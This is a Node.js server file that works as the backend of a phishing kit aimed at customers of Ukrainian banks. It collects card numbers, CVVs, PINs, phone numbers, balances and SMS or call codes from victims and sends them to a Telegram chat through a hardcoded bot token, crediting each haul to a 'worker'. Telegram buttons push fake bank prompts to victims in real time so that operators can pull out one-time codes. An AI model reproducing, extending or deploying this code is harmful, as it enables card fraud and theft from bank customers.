const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// НАСТРОЙКИ
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';

// Динамическое определение WEBHOOK_URL на основе текущего хоста
const getWebhookUrl = () => {
    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = process.env.HOST || 'localhost';
    const port = process.env.PORT || 3000;
    return `${protocol}://${host}:${port}/bot${TELEGRAM_BOT_TOKEN}`;
};
const WEBHOOK_URL = getWebhookUrl();

// СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
const banksForRequestButton = [
    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
    'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

// Логирование запросов
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

// Обслуживание файлов из корня
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Установка webhook с динамическим URL
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

// Тестовое сообщение
bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

// Тест бота
bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook для Telegram
app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (newData.call_code_input) {
        let message = '<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n';
        message += '<b>Код:</b> <code>' + newData.call_code_input + '</code>\n';
        message += '<b>Сесія:</b> <code>' + sessionId + '</code>\n';
        message += '<b>Worker:</b> @' + workerNick + '\n';
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = '<b>Новий запис!</b>\n\n';
        message += '<b>Назва банку:</b> ' + newData.bankName + '\n';
        message += '<b>Номер телефону:</b> <code>' + (newData.phone || 'Не вказано') + '</code>\n';
        message += '<b>Номер карти:</b> <code>' + (newData.card_confirm || newData.card || 'Не вказано') + '</code>\n';
        if (newData['card-expiry']) message += '<b>Термін дії:</b> <code>' + newData['card-expiry'] + '</code>\n';
        if (newData['card-cvv']) message += '<b>CVV:</b> <code>' + newData['card-cvv'] + '</code>\n';
        message += '<b>Пін:</b> <code>' + (newData.pin || 'Не вказано') + '</code>\n';
        if (newData.balance) message += '<b>Поточний баланс:</b> <code>' + newData.balance + '</code>\n';
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
        message += '<b>Кількість переходів:</b> ' + visitText + '\n';
        message += '<b>Worker:</b> @' + workerNick + '\n';

        sendToTelegram(message, sessionId, newData.bankName);
    }

    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = '<b>Отримано SMS!</b>\n\n';
        message += '<b>Код:</b> <code>' + code + '</code>\n';
        message += '<b>Номер телефону:</b> <code>' + sessionData.phone + '</code>\n';
        message += '<b>Сесія:</b> <code>' + sessionId + '</code>\n';
        message += '<b>Worker:</b> @' + workerNick + '\n';
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: 'ДОДАТОК', callback_data: `app:${sessionId}` }
        ],
        [
            { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
            { text: 'КОД', callback_data: `code_error:${sessionId}` },
            { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: 'Карта', callback_data: `card_error:${sessionId}` },
            { text: 'Номер', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                break;
            case 'app':
                commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." };
                break;
            case 'other':
                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
                break;
            case 'pin_error':
                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
                break;
            case 'card_error':
                commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" };
                break;
            case 'number_error':
                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
                break;
            case 'request_details':
                commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === 'Райффайзен' };
                break;
        }

        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT} with host ${process.env.HOST || '0.0.0.0'}`);
});
